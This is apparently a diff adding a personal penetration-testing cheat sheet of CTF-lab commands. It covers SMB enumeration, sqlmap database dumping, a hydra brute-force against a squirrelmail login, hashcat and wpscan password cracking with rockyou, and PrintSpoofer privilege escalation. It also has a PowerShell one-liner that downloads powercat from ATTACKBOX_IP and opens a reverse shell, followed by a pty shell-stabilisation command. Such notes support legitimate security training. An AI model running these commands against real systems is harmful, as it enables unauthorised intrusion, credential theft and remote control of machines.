@@ -1,0 +1,81 @@
+cat ~/.*history | less     #to show history of hidden files
+cat a.txt, less a.txt      #cat and less to read files
+find / -user root -perm -4000 2>/dev/null  #command to search for suid files
+
+SMB Enumeration
+enum4linux -a ip address - enumeration
+
+SSH with key
+ssh kay@10.10.1.2 -i /home/kay/.ssh/id_rsa
+
+Only Use this after saving the request from burp suite
+sqlmap -r request.txt --dbms=mysql --dump
+-r uses the intercepted request you saved earlier
+--dbms tells SQLMap what type of database management system it is
+--dump attempts to outputs the entire database
+
+Bruteforce command using hydra for login page
+hydra -l milesdyson -P log1.txt 10.10.229.33 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
+
+Finding hidden directories
+dirb website-link
+
+Hashcat command
+hashcat -m 1710 -a 0 salt /usr/share/wordlists/rockyou.txt
+1710 - https://hashcat.net/wiki/doku.php?id=example_hashes, search here and choose the number suitable for your hash
+salt - ur hash file
+
+SMB shares command
+smbclient -L ipaddress
+
+SMB connect command
+smbclient \\\\10.10.x.x\\nt4wrksv
+10.10.x.x- ip-address
+nt4wrksv - network share name
+
+SMB Share file put
+After connecting to file sharing network, use the following command
+put hello.txt
+hello.txt = any file 
+http://10.10.157.157:49663/nt4wrksv/hello.txt
+after inseting this into web, should launch the text file.
+
+PrintSpoofer - works window 10 vulnerability 
+Printspoofer command to use for priviledge escalation
+PrintSpoofer.exe -i -c cmd
+
+WP Scan - used for scanning vulnerabilities in webpage created by wordpress
+  Command to use for enumeration
+  wpscan --url http://10.10.67.25/blog -e vp,u
+  -e = enumerate
+  vp = vulnerable plugins
+  u = users
+
+  Command to crack password
+  wpscan --url http://10.10.67.25/blog --usernames admin --passwords /root/Desktop/rockyou.txt
+
+Command to find files
+find / -name *.txt 
+.txt = any extensions
+
+Connecting Window Machine Using RDP
+xfreerdp /u:admin /p:password /cert:ignore /v:10.10.73.95 /workarea
+
+Using powershell to download
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
+To stabalise shell to get into cmd
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+Finding all files with SUID
+find / -perm -u=s -type f 2>/dev/null
+
+Armitage Command To start
+cd /opt/armitage/release/unix && ./teamserver YourIP P@ssw0rd123
+
+CEWL Command
+cat file1.txt file2.txt file3.txt > combined_list.txt #combines the wordlists into one
+sort combined_list.txt | uniq -u > cleaned_combined_list.txt #remove duplicated words
+cewl -w list.txt -d 5 -m 5 http://thm.labs
+-w: will write the contents into a file
+-m 5 :take strings that are more than 5 characters
+-d 5 :depth level of crawling
